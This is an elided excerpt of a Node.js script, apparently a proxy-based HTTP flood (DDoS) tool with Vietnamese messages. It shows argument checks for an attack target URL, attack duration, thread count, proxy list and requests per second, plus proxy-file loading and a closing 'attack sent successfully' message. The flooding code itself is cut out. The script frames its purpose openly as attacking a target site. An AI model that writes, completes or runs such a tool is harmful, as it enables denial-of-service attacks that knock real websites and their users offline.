...
function isPrivate(ip, privateRanges) {
  if (!ip) {
    throw new Error('Địa chỉ IP là bắt buộc');
  }
...
if (!target || !time || !thread || !proxyFile || !rps) {
 console.error(' Lỗi: Vui lòng cung cấp các đối số sau:');
    console.error('  target: URL mục tiêu để tấn công');
    console.error('  time: Thời lượng của cuộc tấn công tính bằng giây');
    console.error('  thread: Số lượng luồng sẽ sử dụng cho cuộc tấn công');
    console.error('  proxylist: Đường dẫn đến tệp chứa danh sách proxy sẽ sử dụng cho cuộc tấn công');
    console.error('  rps: Số lượng yêu cầu tối đa mỗi giây để gửi. Tối đa 512');
...
if (!/^https?:\/\//i.test(target)) {
  console.error('URL mục tiêu phải bắt đầu bằng http:// hoặc https://');
  process.exit(1);
}
...
try {
  ...
  console.error('Lỗi đọc tệp proxy:', err.message);
  process.exit(1);
}

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('RPS phải là số dương');
  process.exit(1);
}
...
console.log(`\n SUCCESS: Tấn công được gửi thành công!\n Target: ${target}\n Duration: ${time} seconds\n Threads: ${thread}\n Requests per second: ${rps}`);
